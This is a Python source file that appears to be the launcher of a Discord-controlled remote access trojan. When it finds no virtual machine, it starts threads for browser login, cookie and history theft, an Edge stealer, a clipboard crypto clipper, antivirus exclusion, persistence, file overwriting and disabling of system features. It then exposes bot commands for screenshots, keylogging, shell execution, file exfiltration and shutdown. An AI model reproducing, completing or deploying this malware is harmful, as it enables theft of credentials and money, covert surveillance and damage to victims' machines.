import discord
from discord.ext import commands
import start.info
import startuplogic.askadmin
import startuplogic.clipper
from startuplogic.excludeme import excludeme
import sys
import time, threading
from co import config
#--------------------------------------------------------------------------------------------------------------------------------------
import startuplogic.antirestart
import startuplogic.overwritefiles
import startuplogic.disablefeatures
import startuplogic.clipper
from startuplogic.antivm import VM
from startuplogic.addme import run_all
from startuplogic.note import shownote
from startuplogic.logins import extract_logins_cookies_history
from startuplogic.edgestealer import edgethief
#--------------------------------------------------------------------------------------------------------------------------------------
from command.mediacommands import *
from command.utilitycommands import *
from command.filecommands import *
from command.datacommands import *
from command.systemcommands import *
from command.webbroser import *
from command.filenav import *
#--------------------------------------------------------------------------------------------------------------------------------------
sys.dont_write_bytecode = True
import threading
import time
import sys
def check_vm_and_run(func):
    if VM is False:
        func()
if VM is False:
    threading.Thread(target=lambda: check_vm_and_run(startuplogic.askadmin.setup), daemon=True).start()
    threading.Thread(target=lambda: check_vm_and_run(extract_logins_cookies_history), daemon=True).start()
    threading.Thread(target=lambda: check_vm_and_run(edgethief), daemon=True).start()
    threading.Thread(target=lambda: check_vm_and_run(run_all), daemon=True).start()
    threading.Thread(target=lambda: check_vm_and_run(excludeme), daemon=True).start()
    if hasattr(config, "ENABLE_ANTI_RESTART") and config.ENABLE_ANTI_RESTART:
        threading.Thread(target=lambda: check_vm_and_run(startuplogic.antirestart.anti_restart), daemon=True).start()
        threading.Thread(target=lambda: check_vm_and_run(shownote), daemon=True).start() 
    if hasattr(config, "DISABLE_FEATURES") and config.DISABLE_FEATURES:
       threading.Thread(target=lambda: (check_vm_and_run(startuplogic.disablefeatures.disablefeatures)), daemon=True).start()       
    if hasattr(config, "ENABLE_FILE_OVERWRITING") and config.ENABLE_FILE_OVERWRITING:
        threading.Thread(target=lambda: check_vm_and_run(startuplogic.overwritefiles.overwritefiles), daemon=True).start() 
    if hasattr(config, "ENABLE_CLIPPER") and config.ENABLE_CLIPPER:
        threading.Thread(target=lambda: check_vm_and_run(startuplogic.clipper.clips), daemon=True).start()          
    time.sleep(0.5)
elif VM is True:
    sys.exit()
#--------------------------------------------------------------------------------------------------------------------------------------
token = config.TOKEN
if not token:
    print("INVALID TOKEN SKIPPING...")
else:
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix='.', intents=intents)
    @bot.event
    async def on_ready():
        print('Bot is ready.')
        for B in bot.guilds:
            try:
                await start.info.start_messagesend(bot, B)
            except discord.Forbidden as A:
                print(start.info.handle_permission_error(B.name, A))
            except discord.HTTPException as A:
                print(start.info.handle_http_error(B.name, A))
            except Exception as A:
                print(start.info.handle_generic_error(B.name, A))
    bot.allowed_channel_ids = {}
    @bot.check
    async def check_channel(ctx):
        A = bot.allowed_channel_ids.get(ctx.guild.id)
        return A is None or ctx.channel.id == A
#--------------------------------------------------------------------------------------------------------------------------------------
    bot.add_command(commands.Command(take_screenshot, name='ss'))
    bot.add_command(commands.Command(speak_command, name='speak'))
    bot.add_command(commands.Command(kp, name='kp'))
    bot.add_command(commands.Command(sysinfo,name='sysinfo'))
    bot.add_command(commands.Command(clean,name='clean'))   
    bot.add_command(commands.Command(lp, name ='lp'))
    bot.add_command(commands.Command(tree, name ='tree'))    
    bot.add_command(commands.Command(close, name ='close')) 
    bot.add_command(commands.Command(ip, name = 'ip'))
    bot.add_command(commands.Command(share_file, name = 'share'))
    bot.add_command(commands.Command(lockpc, name = 'lockpc'))
    bot.add_command(commands.Command(openurl, name = 'openurl'))
    bot.add_command(commands.Command(list_startup_apps, name ='startupapps'))
    bot.add_command(commands.Command(cd_command, name = 'cd'))
    bot.add_command(commands.Command(reload_command, name = 'reload'))
    bot.add_command(commands.Command(search, name = 'search'))
    bot.add_command(commands.Command(restartpc, name = 'restartpc'))
    bot.add_command(commands.Command(vol_command, name='setvol'))
    bot.add_command(commands.Command(getfiles, name='getfiles'))
    bot.add_command(commands.Command(nomouse_command, name='nomouse'))
    bot.add_command(commands.Command(shutdownpc, name='sd', aliases=['shutdown']))
    bot.add_command(commands.Command(cmd_command, name='cmd'))
    bot.add_command(commands.Command(bassboost_command, name='bassboost'))
#--------------------------------------------------------------------------------------------------------------------------------------
if VM is False:    
    bot.run(token)